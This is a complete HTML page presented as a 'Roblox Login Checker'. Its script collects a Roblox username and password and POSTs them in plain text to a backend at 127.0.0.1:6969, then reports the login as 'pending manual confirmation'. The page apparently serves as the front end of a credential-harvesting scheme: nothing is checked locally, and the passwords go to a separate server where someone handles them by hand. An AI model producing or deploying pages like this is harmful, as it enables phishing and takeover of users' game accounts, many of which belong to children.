<!DOCTYPE html>
<html>
<head>
    <title>Roblox Login Checker</title>
</head>
<body>
    <h1>Roblox Login Checker</h1>

    <input type="text" id="username" placeholder="Username" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="sendLogin()">Submit Login</button>

    <p id="status"></p>

    <script>
        async function sendLogin() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const statusEl = document.getElementById("status");

            if (!username || !password) {
                statusEl.innerText = "⚠️ Please enter both username and password.";
                return;
            }

            statusEl.innerText = "⏳ Sending login attempt...";

            try {
                const response = await fetch("http://127.0.0.1:6969/verify", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();

                if (data.status === "pending") {
                    statusEl.innerText = "⏳ Login pending manual confirmation.";
                } else {
                    statusEl.innerText = "⚠️ Unexpected response from backend.";
                }
            } catch (err) {
                statusEl.innerText = "❌ Failed to reach backend!";
                console.error(err);
            }
        }
    </script>
</body>
</html>
